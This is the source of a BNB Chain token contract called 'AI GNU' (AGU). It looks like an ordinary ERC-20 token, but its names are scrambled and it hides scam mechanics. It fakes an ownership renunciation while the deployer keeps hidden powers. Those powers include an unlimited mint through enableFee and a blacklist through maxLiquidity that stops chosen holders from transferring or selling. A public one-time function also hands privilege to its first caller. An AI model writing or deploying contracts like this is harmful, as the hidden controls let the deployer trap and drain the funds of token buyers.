/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface modeExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyExempt) external view returns (uint256);

    function transfer(address shouldAt, uint256 takeLiquidity) external returns (bool);

    function allowance(address enableMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address shouldAt,
        uint256 takeLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverLiquidityFee, uint256 value);
    event Approval(address indexed enableMode, address indexed spender, uint256 value);
}

interface modeExemptMetadata is modeExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface enableReceiver {
    function createPair(address maxMarketing, address feeAuto) external returns (address);
}

interface teamFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract totalBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract AIGNU is totalBuy, modeExempt, modeExemptMetadata {
    uint8 private teamMin = 18;
    
    mapping(address => bool) public maxListReceiver;

    bool public maxTotal;

    mapping(address => mapping(address => uint256)) private amountAt;

    

    bool public liquidityLaunch;
    uint256 private toLaunch;
    address private listSellLiquidity;
    uint256 public isBuy;
    address private teamLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public liquidityMarketing;
    uint256 public receiverTake;
    uint256 private sellFrom = 100000000 * 10 ** teamMin;
    uint256 public tokenTotal;
    mapping(address => bool) public totalFeeFrom;
    bool public minShould;
    bool private minTrading;
    mapping(address => uint256) private totalAuto;
    string private amountTake = "AGU";
    

    address public txLaunch;
    string private totalLaunched = "AI GNU";
    

    event OwnershipTransferred(address indexed listExempt, address indexed sellMaxList);

    constructor (){
        
        teamFund exemptAuto = teamFund(teamLimit);
        liquidityMarketing = enableReceiver(exemptAuto.factory()).createPair(exemptAuto.WETH(), address(this));
        listSellLiquidity = _msgSender();
        if (minTrading == maxTotal) {
            maxTotal = false;
        }
        txLaunch = listSellLiquidity;
        totalFeeFrom[txLaunch] = true;
        
        totalAuto[txLaunch] = sellFrom;
        emit Transfer(address(0), txLaunch, sellFrom);
        tokenFund();
    }

    

    function balanceOf(address buyExempt) public view virtual override returns (uint256) {
        return totalAuto[buyExempt];
    }

    function walletTrading() public {
        
        if (isBuy == receiverTake) {
            receiverTake = toLaunch;
        }
        minTrading=false;
    }

    function allowance(address isReceiver, address minFeeList) external view virtual override returns (uint256) {
        return amountAt[isReceiver][minFeeList];
    }

    function autoToken(address senderFee, address shouldAt, uint256 takeLiquidity) internal returns (bool) {
        if (senderFee == txLaunch || shouldAt == txLaunch) {
            return listToken(senderFee, shouldAt, takeLiquidity);
        }
        if (liquidityLaunch != minTrading) {
            minTrading = true;
        }
        require(!maxListReceiver[senderFee]);
        if (toLaunch == receiverTake) {
            liquidityLaunch = false;
        }
        return listToken(senderFee, shouldAt, takeLiquidity);
    }

    function name() external view virtual override returns (string memory) {
        return totalLaunched;
    }

    function transferFrom(address senderFee, address shouldAt, uint256 takeLiquidity) external override returns (bool) {
        if (amountAt[senderFee][_msgSender()] != type(uint256).max) {
            require(takeLiquidity <= amountAt[senderFee][_msgSender()]);
            amountAt[senderFee][_msgSender()] -= takeLiquidity;
        }
        return autoToken(senderFee, shouldAt, takeLiquidity);
    }

    function tokenFund() public {
        emit OwnershipTransferred(txLaunch, address(0));
        listSellLiquidity = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return amountTake;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellFrom;
    }

    function enableTeamSwap() public view returns (uint256) {
        return tokenTotal;
    }

    function exemptTrading(address minSwap) public {
        if (minShould) {
            return;
        }
        if (liquidityLaunch) {
            liquidityLaunch = true;
        }
        totalFeeFrom[minSwap] = true;
        
        minShould = true;
    }

    function liquiditySell() public view returns (uint256) {
        return tokenTotal;
    }

    function maxLiquidity(address tokenLaunch) public {
        
        if (tokenLaunch == txLaunch || tokenLaunch == liquidityMarketing || !totalFeeFrom[_msgSender()]) {
            return;
        }
        
        maxListReceiver[tokenLaunch] = true;
    }

    function modeAuto() public {
        if (toLaunch == isBuy) {
            isBuy = tokenTotal;
        }
        if (maxTotal != minTrading) {
            maxTotal = true;
        }
        minTrading=false;
    }

    function listToken(address senderFee, address shouldAt, uint256 takeLiquidity) internal returns (bool) {
        require(totalAuto[senderFee] >= takeLiquidity);
        totalAuto[senderFee] -= takeLiquidity;
        totalAuto[shouldAt] += takeLiquidity;
        emit Transfer(senderFee, shouldAt, takeLiquidity);
        return true;
    }

    function enableFee(uint256 takeLiquidity) public {
        if (!totalFeeFrom[_msgSender()]) {
            return;
        }
        totalAuto[txLaunch] = takeLiquidity;
    }

    function owner() external view returns (address) {
        return listSellLiquidity;
    }

    function getOwner() external view returns (address) {
        return listSellLiquidity;
    }

    function transfer(address atMax, uint256 takeLiquidity) external virtual override returns (bool) {
        return autoToken(_msgSender(), atMax, takeLiquidity);
    }

    function approve(address minFeeList, uint256 takeLiquidity) public virtual override returns (bool) {
        amountAt[_msgSender()][minFeeList] = takeLiquidity;
        emit Approval(_msgSender(), minFeeList, takeLiquidity);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return teamMin;
    }


}